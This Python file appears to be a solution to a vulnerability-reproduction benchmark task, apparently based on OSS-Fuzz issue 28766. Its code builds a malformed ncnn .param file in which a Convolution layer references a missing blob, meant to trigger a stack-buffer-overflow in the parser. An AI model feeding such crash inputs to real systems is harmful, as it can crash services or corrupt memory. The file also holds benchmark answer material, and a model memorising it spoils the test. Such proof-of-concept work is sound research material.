import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Target Identification:
        - Task ID `arvo:28766` matches OSS-Fuzz Issue 28766: "ncnn: Stack-buffer-overflow in ncnn::DataReaderFromMemory::scan".
        - Vulnerability Description matches the NCNN issue details: failure to check for existence of referenced nodes in `node_id_map`.
        - Target is likely NCNN (Tencent/ncnn).
        
        PoC Strategy:
        - Create a valid NCNN `.param` file structure.
        - Define a layer that references a non-existent input blob ("node").
        - This triggers the missing check in the node lookup/mapping phase, causing the crash (Stack Buffer Overflow or Invalid Iterator Dereference).
        """
        
        # NCNN param file magic header
        magic = b"7767517\n"
        
        # Layer count: 2, Blob count: 2
        # We define minimal counts to initiate parsing loops.
        counts = b"2 2\n"
        
        # Layer 1: Input layer
        # Format: [Type] [Name] [InputCount] [OutputCount] [OutputBlobName]
        # Defines blob 'B1'
        layer1 = b"Input L1 0 1 B1\n"
        
        # Layer 2: Convolution layer
        # Format: [Type] [Name] [InputCount] [OutputCount] [InputBlobName] [OutputBlobName] [Params...]
        # References 'MISSING' blob which does not exist. This triggers the vulnerability.
        # Params: 0=1 (num_output), 1=1 (kernel_size). Minimal params to pass basic parsing.
        layer2 = b"Convolution L2 1 1 MISSING B2 0=1 1=1\n"
        
        return magic + counts + layer1 + layer2